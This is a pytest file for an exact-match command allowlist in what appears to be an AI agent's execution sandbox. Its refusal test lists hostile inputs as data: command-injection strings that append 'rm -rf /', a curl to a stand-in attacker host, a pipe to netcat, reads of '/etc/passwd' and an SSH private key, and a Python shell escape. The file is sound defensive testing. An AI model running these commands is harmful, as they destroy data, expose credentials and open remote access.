"""The command allowlist is exact-match by design. These tests prove it."""

import pytest

from ai_team.execution.sandbox.allowlist import (
    CommandNotAllowedError,
    allowed_commands,
    is_allowed,
    resolve_argv,
)


def test_the_default_declared_command_resolves_to_argv():
    argv = resolve_argv("python3 -m unittest test_main.py")
    assert argv[0] == "python"
    assert "unittest" in argv
    assert "test_main.py" in argv


def test_surrounding_whitespace_is_tolerated():
    assert resolve_argv("  python3 -m unittest test_main.py  ")[0] == "python"


def test_resolved_argv_is_a_fresh_list():
    """Callers must not be able to mutate the allowlist through its return value."""
    first = resolve_argv("python3 -m unittest test_main.py")
    first.append("--evil")
    assert "--evil" not in resolve_argv("python3 -m unittest test_main.py")


@pytest.mark.parametrize(
    "command",
    [
        # The injection the old prefix matcher happily accepted.
        "python3 -m unittest test_main.py; rm -rf /",
        "python3 -m unittest test_main.py && curl http://evil.example",
        "python3 -m unittest test_main.py | nc attacker 4444",
        "python3 -m unittest test_main.py `whoami`",
        "python3 -m unittest test_main.py $(id)",
        "python3 -m unittest test_main.py\nrm -rf /",
        # Prefix matches that are not the whole command.
        "python3 -m unittest test_main.py --extra",
        "python3 -m unittest other_tests.py",
        # Previously whitelisted reconnaissance commands.
        "ls",
        "ls -la /",
        "cat /etc/passwd",
        "cat ~/.ssh/id_rsa",
        # Arbitrary execution.
        "python3 -c 'import os; os.system(\"sh\")'",
        "pip install requests",
        "sh -c 'echo hi'",
        "",
        "   ",
    ],
)
def test_anything_not_exactly_allowed_is_refused(command):
    assert not is_allowed(command)
    with pytest.raises(CommandNotAllowedError):
        resolve_argv(command)


def test_no_allowed_command_contains_shell_metacharacters():
    """Nothing on the list should need a shell, so nothing may imply one."""
    for command in allowed_commands():
        for char in (";", "&", "|", "`", "$", ">", "<", "\n"):
            assert char not in command, f"{command!r} contains {char!r}"


def test_every_allowed_command_maps_to_a_python_module_invocation():
    for command in allowed_commands():
        argv = resolve_argv(command)
        assert argv[0] == "python"
        assert argv[1] == "-m"
